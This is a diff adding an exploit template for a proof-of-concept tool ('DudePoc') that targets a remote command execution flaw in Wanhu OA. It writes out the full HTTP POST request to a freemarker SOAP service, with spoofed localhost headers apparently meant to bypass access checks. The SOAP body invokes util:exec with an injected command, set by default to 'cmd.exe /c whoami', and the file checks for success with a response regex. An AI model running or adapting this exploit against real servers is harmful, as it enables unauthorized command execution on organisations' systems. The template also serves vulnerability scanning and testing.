@@ -1,0 +1,29 @@
+﻿<DudePoc_Name>万户 OA 命令执行</DudePoc_Name>
+<DudePoc_Description>万户 OA 命令执行</DudePoc_Description>
+<DudePoc_SetHeader>
+POST /defaultroot/services/./././freemarkeService HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+X-Forwarded-For: 127.0.0.1
+X-Originating: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
+<soapenv:Header/>
+<soapenv:Body>
+<util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<arguments xsi:type="xst:ArrayOf_xsd_anyType" soapenc:arrayType="xsd:anyType[]">
+<cmd xsi:type="soapenc:string">
+$<AttackCode>$</cmd>
+</arguments>
+</util:exec>
+</soapenv:Body>
+</soapenv:Envelope>
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>^(?=.*?(?:version|xml|命令)).*?$</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode>c:\windows\system32\cmd.exe /c whoami</DudePoc_AttackCode>
